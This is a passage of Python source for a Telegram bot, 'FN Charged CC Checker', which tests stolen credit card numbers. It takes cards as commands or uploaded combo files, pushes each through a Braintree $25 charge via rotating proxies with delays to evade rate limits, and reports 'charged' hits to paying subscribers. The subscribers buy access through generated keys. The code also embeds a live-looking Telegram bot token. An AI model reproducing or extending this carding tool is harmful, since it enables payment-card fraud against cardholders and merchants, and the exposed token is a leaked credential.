━━━━━━━━━━━━━━━━━━━━━━
[⌬] FN CHECKER HITS
━━━━━━━━━━━━━━━━━━━━━━
[✪] Charged: {task_stats['approved']}
[❌] Declined: {task_stats['declined']}
[✪] Total: {task_stats['total']}
[✪] Duration: {duration:.2f} seconds
[✪] Avg Speed: {avg_speed:.2f} cards/sec
[✪] Success Rate: {success_rate:.2f}%
━━━━━━━━━━━━━━━━━━━━━━
[み] DEV: <a href="{dev_link}">{dev_name}</a>
━━━━━━━━━━━━━━━━━━━━━━
"""
        with open(hits_file_path, 'rb') as f:
            await context.bot.send_document(
                chat_id=chat_id,
                document=f,
                filename=hits_file_name,
                caption=summary_message,
                parse_mode='HTML'
            )

    active_tasks.pop(chat_id, None)
    context.chat_data.pop('stats', None)  # Clean up stats when done

# Handle document uploads
async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id
    if not check_access(user_id):
        await update.message.reply_text("❌ You are not authorized to use this bot.")
        return
    document = update.message.document
    if not document.file_name.endswith('.txt'):
        await update.message.reply_text("Please send a .txt file.")
        return
    file = await document.get_file()
    os.makedirs('temp', exist_ok=True)
    file_path = os.path.join('temp', document.file_name)
    await file.download_to_drive(file_path)
    await update.message.reply_text("✅ File received! Starting checking...\n⚡ Progress will be updated every 50 cards")
    asyncio.create_task(process_file(file_path, update, context))  # Run in background

# /chk command
async def chk(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id
    if not check_access(user_id):
        await update.message.reply_text("❌ You are not authorized to use this bot.")
        return
    if len(context.args) != 1:
        await update.message.reply_text("Usage: /chk <cc|mm|yy|cvv>")
        return
    cc_input = context.args[0]
    if '|' not in cc_input or len(cc_input.split('|')) != 4:
        await update.message.reply_text("Invalid format. Use: /chk cc|mm|yy|cvv")
        return
    card_number, expiry_month, expiry_year, cvv = cc_input.split('|')
    full_card_details = f"{card_number}|{expiry_month}|{expiry_year}|{cvv}"
    logger.debug(f"Checking single card: {full_card_details}")

    task_stats = {
        'approved': 0,
        'declined': 0,
        'checked': 0,
        'total': 1,
        'start_time': time.time()
    }
    context.chat_data['stats'] = task_stats  # Store stats in chat_data

    initial_message = f"""
𝗖𝗮𝗿𝗱: {full_card_details}
𝗦𝘁𝗮𝘁𝘂𝘀: Checking...
𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲: ■■■□
𝗚𝗮𝘁𝗲𝘄𝗮𝘆: Braintree 25$
"""
    initial_msg = await context.bot.send_message(chat_id=chat_id, text=initial_message, parse_mode='HTML')

    start_time = time.time()
    proxies = get_proxies(1)  # Get one proxy, reusing if needed
    proxy = proxies[0]

    tkn, mm, yy, bin, card_type, lastfour, lasttwo, bin_data = await run_sync_func(b3req, card_number, expiry_month, expiry_year, proxy)
    if tkn is None:
        await initial_msg.edit_text("Error processing card.")
        return
    final = await run_sync_func(brainmarkreq, tkn, mm, yy, bin, card_type, lastfour, lasttwo, proxy)

    end_time = time.time()
    duration = end_time - start_time

    user_name = update.effective_user.first_name or update.effective_user.username or "Unknown User"
    profile_link = f"tg://user?id={user_id}"
    info = card_type.upper() if card_type else "Unknown"
    is_debit = bin_data.get('debit', 'Unknown') if bin_data else 'Unknown'
    is_credit = 'No' if is_debit == 'Yes' else 'Yes'
    card_type_details = f"{info} (Debit: {is_debit}, Credit: {is_credit})"
    issuer = bin_data.get('issuingBank', 'Unknown') if bin_data else 'Unknown'
    issuer_formatted = f"({issuer}) 🏛" if issuer != 'Unknown' else 'Unknown'
    country_code = bin_data.get('countryOfIssuance', 'USA').upper() if bin_data else 'USA'
    country_full, country_flag = country_mapping.get(country_code, ('Unknown', '🇺🇳'))
    tier = check_access(user_id)

    task_stats['checked'] = 1
    if is_charged(final):
        task_stats['approved'] = 1
        response_text = "Insufficient Funds" if "insufficient funds" in final.lower() else "CHARGED 25$😈⚡"
        response_message = f"""
『 Braintree 25$ [ /chk ] 』
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
𝗖𝗮𝗿𝗱 ➜ {full_card_details}
𝐒𝐭𝐚𝐭𝐮𝐬 ➜ 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅
𝐑𝐞𝐬𝗽𝗼𝗻𝘀𝗲 ➜ {response_text}
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
𝗜𝗻𝗳𝗼 ➜ {card_type_details}
𝐁𝐚𝗻𝗸 ➜ {issuer_formatted}
𝐂𝐨𝘂𝗻𝘁𝗿𝘆 ➜ {country_full} {country_flag}
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
𝗧𝗶𝗺𝗲 ➜ {duration:.2f} seconds
𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲 ➜ <a href="{profile_link}">{user_name}</a> ({tier} {TIERS[tier]['emoji'] if tier in TIERS else ''})
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
𝐁𝐨𝐭 𝐁𝐲 ➜ <a href="https://t.me/FNxELECTRA">𓆰𝅃꯭᳚⚡!! ⏤‌‌‌‌𝐅ɴ x EʟᴇᴄᴛʀᴀOᴘ𓆪𓆪⏤‌‌➤⃟🔥✘</a>
"""
        await initial_msg.edit_text(response_message, parse_mode='HTML')
    else:
        task_stats['declined'] = 1
        response_message = f"""
𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱❌

𝗖𝗮𝗿𝗱: {full_card_details}
𝗚𝗮𝘁𝗲𝘄𝗮𝘆: Braintree 25$
𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲: {final}

𝗜𝗻𝗳𝗼: {card_type_details}
𝗜𝘀𝘀𝘂𝗲𝗿: {issuer_formatted}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country_full} {country_flag}

𝗧𝗶𝗺𝗲: {duration:.2f} seconds
𝗖𝗵𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: <a href="{profile_link}">{user_name}</a> ({tier} {TIERS[tier]['emoji'] if tier in TIERS else ''})
"""
        await initial_msg.edit_text(response_message, parse_mode='HTML')

    context.chat_data['stats'] = task_stats  # Update stats

# /mchk command
async def mchk(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id
    if not check_access(user_id):
        await update.message.reply_text("❌ You are not authorized to use this bot.")
        return
    message_text = update.message.text
    lines = message_text.split('\n')[1:]
    if not lines:
        await update.message.reply_text("Usage: /mchk\n<cc1|mm|yy|cvv>\n<cc2|mm|yy|cvv>...")
        return
    
    task_stats = {
        'approved': 0,
        'declined': 0,
        'checked': 0,
        'total': len(lines),
        'start_time': time.time()
    }
    context.chat_data['stats'] = task_stats  # Store stats in chat_data
    active_tasks[chat_id] = True

    dev_name = "𓆰𝅃꯭᳚⚡!! ⏤‌‌‌‌𝐅ɴ x EʟᴇᴄᴛʀᴀOᴘ𓆪𓆪⏤‌‌➤⃟🔥✘"
    dev_link = "https://t.me/FNxELECTRA"

    batch_size = 3
    for i in range(0, len(lines), batch_size):
        if chat_id not in active_tasks:
            break

        batch = lines[i:i + batch_size]
        batch = [line for line in batch if '|' in line and len(line.split('|')) == 4]
        if not batch:
            continue

        proxies = get_proxies(len(batch))
        tasks = [process_card(card, proxy, update, context) for card, proxy in zip(batch, proxies)]
        results = await asyncio.gather(*tasks, return_exceptions=True)

        for result in results:
            if isinstance(result, Exception):
                logger.error(f"Error processing card: {result}")
                task_stats['declined'] += 1
                task_stats['checked'] += 1
                context.chat_data['stats'] = task_stats  # Update stats
                continue

            if result[0] is None:
                task_stats['declined'] += 1
                task_stats['checked'] += 1
                context.chat_data['stats'] = task_stats  # Update stats
                continue

            full_card, final, _, _ = result
            task_stats['checked'] += 1

            if is_charged(final):
                task_stats['approved'] += 1
                response_text = "Insufficient Funds" if "insufficient funds" in final.lower() else "CHARGED 25$😈⚡"
                await context.bot.send_message(chat_id=chat_id, text=f"<b>Approved✅</b> {full_card.split('|')[0]} - Response: {response_text}", parse_mode='HTML')
            else:
                task_stats['declined'] += 1
                await context.bot.send_message(chat_id=chat_id, text=f"{final} {full_card.split('|')[0]}")

            context.chat_data['stats'] = task_stats  # Update stats after each card

        if task_stats['checked'] % 50 == 0 or task_stats['checked'] == task_stats['total']:
            duration = time.time() - task_stats['start_time']
            avg_speed = task_stats['checked'] / duration if duration > 0 else 0
            success_rate = (task_stats['approved'] / task_stats['checked'] * 100) if task_stats['checked'] > 0 else 0
            progress_message = f"""
<b>[⌬] 𝐅𝐍 𝐂𝐇𝐄𝐂𝐊𝐄𝐑 𝐋𝐈𝐕𝐄 𝐏𝐑𝐎𝐆𝐑𝐄𝐒𝐒 😈⚡</b>
━━━━━━━━━━━━━━━━━━━━━━
<b>[✪] 𝐂𝐡𝐚𝐫𝐠𝐞𝐝:</b> {task_stats['approved']}
<b>[❌] 𝐃𝐞𝐜𝐥𝗶𝗻𝗲𝗱:</b> {task_stats['declined']}
<b>[✪] 𝐂𝐡𝐞𝐜𝐤𝐞𝐝:</b> {task_stats['checked']}/{task_stats['total']}
<b>[✪] 𝐓𝐨𝐭𝐚𝐥:</b> {task_stats['total']}
<b>[✪] 𝐃𝐮𝐫𝐚𝘁𝗶𝗼𝗻:</b> {duration:.2f} seconds
<b>[✪] 𝐀𝐯𝐠 𝐒𝐩𝐞𝐞𝐝:</b> {avg_speed:.2f} cards/sec
<b>[✪] 𝐒𝐮𝗰𝗰𝗲𝘀𝘀 𝐑𝐚𝘁𝗲:</b> {success_rate:.2f}%
━━━━━━━━━━━━━━━━━━━━━━
<b>[み] 𝐃𝐞𝐯: <a href="{dev_link}">{dev_name}</a> ⚡😈</b>
━━━━━━━━━━━━━━━━━━━━━━
"""
            await context.bot.send_message(chat_id=chat_id, text=progress_message, parse_mode='HTML')

        if i + batch_size < len(lines):
            logger.info(f"Chat {chat_id}: Waiting 60 seconds to avoid rate limiting...")
            await asyncio.sleep(60)

    active_tasks.pop(chat_id, None)
    context.chat_data.pop('stats', None)  # Clean up stats when done

# /start command
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not check_access(user_id):
        await update.message.reply_text("❌ You are not authorized to use this bot. Redeem a key with /redeem <key> or contact the owner.")
        return
    keyboard = [
        [InlineKeyboardButton("📤 Upload Combo", callback_data='upload_combo')],
        [InlineKeyboardButton("⏹️ Cancel Check", callback_data='cancel_check')],
        [InlineKeyboardButton("📊 Live Stats", callback_data='live_stats')],
        [InlineKeyboardButton("? Help", callback_data='help')],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        "🔥 𝐖𝐞𝐥𝐜𝐨𝐦𝐞 𝐓𝐨 𝐅𝐍 𝐂𝐇𝐀𝐑𝐆𝐄𝐃 𝐂𝐂 𝐂𝐇𝐄𝐂𝐊𝐄𝐑! 🔥\n"
        "🔍 𝐔𝐬𝐞 /chk 𝐓𝐨 𝐂𝐡𝐞𝐜𝐤 𝐒𝐢𝐧𝐠𝐥𝐞 𝐂𝐂\n"
        "⚡𝐔𝐬𝐞 /mchk 𝐓𝐨 𝐂𝐡𝐞𝐜𝐤 𝐔𝐩𝐭𝐨 5 𝐂𝐂𝐬\n"
        "📤 𝐂𝐥𝐢𝐜𝐤 𝐎𝐧 𝐔𝐩𝐥𝐨𝐚𝐝 𝐂𝐨𝐦𝐛𝐨 𝐓𝐡𝐞𝐧 𝐒𝐞𝐧𝐝 .𝐓𝐱𝐭 𝐅𝐢𝐥𝐞:",
        reply_markup=reply_markup
    )

# Handle button clicks
async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    chat_id = query.message.chat_id
    await query.answer()
    dev_name = "𓆰𝅃꯭᳚⚡!! ⏤‌‌‌‌𝐅ɴ x EʟᴇᴄᴛʀᴀOᴘ𓆪𓆪⏤‌‌➤⃟🔥✘"
    dev_link = "https://t.me/FNxELECTRA"

    if query.data == 'upload_combo':
        await query.edit_message_text("📤 Please upload your combo file (.txt)")
    elif query.data == 'cancel_check':
        active_tasks.pop(chat_id, None)
        await query.edit_message_text("⏹️ Checking cancelled!🛑")
    elif query.data == 'live_stats':
        task_stats = context.chat_data.get('stats', {'approved': 0, 'declined': 0, 'checked': 0, 'total': 0, 'start_time': time.time()})
        if not task_stats.get('start_time'):
            task_stats['start_time'] = time.time()
        duration = time.time() - task_stats['start_time'] if task_stats['start_time'] > 0 else 0
        avg_speed = task_stats['checked'] / duration if duration > 0 else 0
        success_rate = (task_stats['approved'] / task_stats['checked'] * 100) if task_stats['checked'] > 0 else 0
        stats_message = f"""
━━━━━━━━━━━━━━━━━━━━━━
[⌬] 𝐅𝐍 𝐂𝐇𝐄𝐂𝐊𝐄𝐑 𝐒𝐓𝐀𝐓𝐈𝐂𝐒 😈⚡
━━━━━━━━━━━━━━━━━━━━━━
[✪] 𝐂𝐡𝐚𝐫𝐠𝐞𝐝: {task_stats['approved']}
[❌] 𝐃𝐞𝐜𝐥𝗶𝗻𝗲𝗱: {task_stats['declined']}
[✪] 𝐓𝐨𝐭𝐚𝐥: {task_stats['total']}
[✪] 𝐃𝐮𝐫𝐚𝘁𝗶𝘂𝗻: {duration:.2f} seconds
[✪] 𝐀𝐯𝐠 𝐒𝐩𝐞𝐞𝐝: {avg_speed:.2f} cards/sec
[✪] 𝐒𝐮𝗰𝗰𝗲𝘀𝘀 𝐑𝐚𝘁𝗲: {success_rate:.2f}%
━━━━━━━━━━━━━━━━━━━━━━
[み] 𝐃𝐞𝐯: <a href="{dev_link}">{dev_name}</a> ⚡😈
━━━━━━━━━━━━━━━━━━━━━━
"""
        await query.edit_message_text(stats_message, parse_mode='HTML')
    elif query.data == 'help':
        await query.edit_message_text("Help: Use /chk <cc|mm|yy|cvv> for single check or upload a .txt file with combos.")

# /stop command
async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id
    if not check_access(user_id):
        await update.message.reply_text("❌ You are not authorized to use this bot.")
        return
    active_tasks.pop(chat_id, None)
    await update.message.reply_text("⏹️ Process Stopped!🛑")

# /allow command
async def allow(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id != OWNER_ID and check_access(user_id) != 'Owner':
        await update.message.reply_text("❌ Only the owner can use this command.")
        return
    if len(context.args) != 2:
        await update.message.reply_text("Usage: /allow <user_id> <tier>")
        return
    target_id, tier = context.args
    if tier not in TIERS:
        await update.message.reply_text(f"Invalid tier. Available tiers: {', '.join(TIERS.keys())}")
        return
    try:
        target_id = int(target_id)
        users_collection.update_one(
            {'user_id': target_id},
            {'$set': {'allowed': True, 'tier': tier, 'subscription_expires': datetime.now() + timedelta(days=365)}},
            upsert=True
        )
        await update.message.reply_text(f"✅ User {target_id} has been allowed with tier {tier} {TIERS[tier]['emoji']}.")
    except ValueError:
        await update.message.reply_text("Invalid user ID.")

# /broadcast command
async def broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id != OWNER_ID and check_access(user_id) != 'Owner':
        await update.message.reply_text("❌ Only the owner can use this command.")
        return
    if not context.args:
        await update.message.reply_text("Usage: /broadcast <message>")
        return
    message = " ".join(context.args)
    users = users_collection.find({'allowed': True})
    for user in users:
        try:
            await context.bot.send_message(chat_id=user['user_id'], text=f"📢 Broadcast from Owner:\n{message}")
        except Exception as e:
            logger.error(f"Failed to send broadcast to {user['user_id']}: {e}")
    await update.message.reply_text("✅ Broadcast sent to all allowed users.")

# /genkey command
async def genkey(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id != OWNER_ID and check_access(user_id) != 'Owner':
        await update.message.reply_text("❌ Only the owner can use this command.")
        return
    if len(context.args) != 3:
        await update.message.reply_text("Usage: /genkey <duration> <tier> <quantity> (e.g., /genkey 1d Silver 10)")
        return
    duration_str, tier, quantity_str = context.args
    if tier not in TIERS:
        await update.message.reply_text(f"Invalid tier. Available tiers: {', '.join(TIERS.keys())}")
        return
    duration_days = {'1d': 1, '7d': 7, '30d': 30}
    if duration_str not in duration_days:
        await update.message.reply_text("Invalid duration. Use: 1d, 7d, 30d")
        return
    try:
        quantity = int(quantity_str)
        if quantity <= 0:
            await update.message.reply_text("Quantity must be a positive number.")
            return
    except ValueError:
        await update.message.reply_text("Invalid quantity. Please provide a number.")
        return

    keys = []
    for _ in range(quantity):
        key = f"FN-CHECKER-B3-{secrets.token_hex(2).upper()}-{secrets.token_hex(3).upper()}"
        keys_collection.insert_one({
            'key': key,
            'tier': tier,
            'duration_days': duration_days[duration_str],
            'created_at': datetime.now(),
            'used': False
        })
        keys.append(key)

    response = f"""
𝐆𝐢𝐟𝐭𝐜𝗼𝗱𝐞 𝐆𝐞𝐧𝐞𝐫𝐚𝐭𝐞𝐝 ✅
𝐀𝐦𝐨𝘂𝗻𝘁: {quantity}
"""
    for key in keys:
        response += f"""
➔ {key}
𝐕𝐚𝐥𝐮𝐞: {tier} ({duration_days[duration_str]} 𝐃𝐚𝐲𝐬)
"""
    response += f"""
𝐅𝐨𝐫 𝐑𝐞𝗱𝐞𝐞𝗺𝘁𝗶𝗼𝗻 
𝐓𝐲𝗽𝐞 /redeem {keys[0]}
"""
    await update.message.reply_text(response, parse_mode='HTML')

# /redeem command
async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if len(context.args) != 1:
        await update.message.reply_text("Usage: /redeem <key>")
        return
    key = context.args[0]
    key_data = keys_collection.find_one({'key': key, 'used': False})
    user_id = update.effective_user.id

    if not key_data:
        redeemed_key = keys_collection.find_one({'key': key})
        if redeemed_key and redeemed_key['used']:
            response = f"""
𝐀𝐥𝐫𝐞𝐚𝗱𝐲 𝐑𝐞𝗱𝐞𝐞𝗺𝐞𝗱 ⚠️

𝗚𝗶𝗳𝘁𝗰𝗼𝗱𝗲: {key}

𝐌𝐞𝐬𝐬𝐚𝐠𝐞: 𝐓𝐡𝗶𝐬 𝐠𝗶𝗳𝘁 𝗰𝗼𝗱𝗲 𝗶𝘀 𝐀𝐥𝐫𝐞𝐚𝗱𝐲 𝐑𝐞𝗱𝐞𝐞𝗺𝐞𝗱 𝐛𝐲 𝐚𝗻𝗼𝘁𝗵𝗲𝗿 𝘂𝘀𝗲𝗿.
"""
            await update.message.reply_text(response, parse_mode='HTML')
        else:
            await update.message.reply_text("❌ Invalid or already used key.")
        return

    expires_at = datetime.now() + timedelta(days=key_data['duration_days'])
    users_collection.update_one(
        {'user_id': user_id},
        {'$set': {'allowed': True, 'tier': key_data['tier'], 'subscription_expires': expires_at}},
        upsert=True
    )
    keys_collection.update_one({'key': key}, {'$set': {'used': True}})
    response = f"""
𝗥𝗲𝗱𝗲𝗲𝗺𝗲𝗱 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 ✅
━━━━━━━━━━━━━━
𝗚𝗶𝗳𝘁𝗰𝗼𝗱𝗲: {key}
𝗨𝘀𝗲𝗿 𝗜𝗗: {user_id}

𝐌𝐞𝐬𝐬𝐚𝐠𝐞: 𝐂𝗼𝗻𝗴𝗿𝗮𝘁𝘇! 𝐘𝗼𝘂𝗿 𝐏𝗿𝗼𝘃𝗶𝗱𝗲𝗱 𝐆𝗶𝗳𝘁𝗰𝗼𝗱𝗲 𝐒𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 𝐑𝐞𝗱𝐞𝐞𝗺𝐞𝗱 𝘁𝗼 𝐘𝗼𝘂𝗿 𝐀𝗰𝗰𝗼𝘂𝗻𝘁, 𝐀𝗻𝗱 𝐘𝗼𝘂 𝐆𝗼𝘁 𝗮 "{key_data['tier']} 𝐅𝗼𝗿 {key_data['duration_days']} 𝐃𝐚𝐲𝐬".
"""
    await update.message.reply_text(response, parse_mode='HTML')

# /stats command
async def stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id
    if not check_access(user_id):
        await update.message.reply_text("❌ You are not authorized to use this bot.")
        return
    task_stats = context.chat_data.get('stats', {'approved': 0, 'declined': 0, 'checked': 0, 'total': 0, 'start_time': time.time()})
    if not task_stats.get('start_time'):
        task_stats['start_time'] = time.time()
    duration = time.time() - task_stats['start_time'] if task_stats['start_time'] > 0 else 0
    avg_speed = task_stats['checked'] / duration if duration > 0 else 0
    success_rate = (task_stats['approved'] / task_stats['checked'] * 100) if task_stats['checked'] > 0 else 0
    dev_name = "𓆰𝅃꯭᳚⚡!! ⏤‌‌‌‌𝐅ɴ x EʟᴇᴄᴛʀᴀOᴘ𓆪𓆪⏤‌‌➤⃟🔥✘"
    dev_link = "https://t.me/FNxELECTRA"
    stats_message = f"""
━━━━━━━━━━━━━━━━━━━━━━
[⌬] 𝐅𝐍 𝐂𝐇𝐄𝐂𝐊𝐄𝐑 𝐒𝐓𝐀𝐓𝐈𝐂𝐒 😈⚡
━━━━━━━━━━━━━━━━━━━━━━
[✪] 𝐂𝐡𝐚𝐫𝐠𝐞𝐝: {task_stats['approved']}
[❌] 𝐃𝐞𝐜𝐥𝗶𝗻𝗲𝗱: {task_stats['declined']}
[✪] 𝐓𝐨𝐭𝐚𝐥: {task_stats['total']}
[✪] 𝐃𝐮𝐫𝐚𝘁𝗶𝘂𝗻: {duration:.2f} seconds
[✪] 𝐀𝐯𝐠 𝐒𝐩𝐞𝐞𝐝: {avg_speed:.2f} cards/sec
[✪] 𝐒𝐮𝗰𝗰𝗲𝘀𝘀 𝐑𝐚𝘁𝗲: {success_rate:.2f}%
━━━━━━━━━━━━━━━━━━━━━━
[み] 𝐃𝐞𝐯: <a href="{dev_link}">{dev_name}</a> ⚡😈
━━━━━━━━━━━━━━━━━━━━━━
"""
    await context.bot.send_message(chat_id=chat_id, text=stats_message, parse_mode='HTML')

# /disallow command
async def disallow(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id != OWNER_ID and check_access(user_id) != 'Owner':
        await update.message.reply_text("❌ Only the owner can use this command.")
        return
    if len(context.args) != 1:
        await update.message.reply_text("Usage: /disallow <user_id>")
        return
    target_id = context.args[0]
    try:
        target_id = int(target_id)
        user = users_collection.find_one({'user_id': target_id})
        if not user:
            await update.message.reply_text(f"❌ User {target_id} not found.")
            return
        users_collection.update_one({'user_id': target_id}, {'$set': {'allowed': False}})
        await update.message.reply_text(f"✅ User {target_id} has been disallowed.")
    except ValueError:
        await update.message.reply_text("Invalid user ID.")

# Main function to run the bot
def main():
    # Initialize proxies and countries
    if not load_proxies():
        logger.error("Failed to load proxies. Exiting...")
        return
    load_countries()

    # Bot token (replace with your bot token)
    TOKEN = '7620898782:AAFpTD0KXDqE9hYjObM9WEwGLDOtfHFo3C0'  # Replace with your actual bot token

    # Initialize the application
    application = ApplicationBuilder().token(TOKEN).build()

    # Add handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("chk", chk))
    application.add_handler(CommandHandler("mchk", mchk))
    application.add_handler(CommandHandler("stop", stop))
    application.add_handler(CommandHandler("allow", allow))
    application.add_handler(CommandHandler("broadcast", broadcast))
    application.add_handler(CommandHandler("genkey", genkey))
    application.add_handler(CommandHandler("redeem", redeem))
    application.add_handler(CommandHandler("stats", stats))
    application.add_handler(CommandHandler("disallow", disallow))
    application.add_handler(CallbackQueryHandler(button))
    application.add_handler(MessageHandler(filters.Document.ALL, handle_document))

    # Start the bot
    application.run_polling()

if __name__ == '__main__':
    main()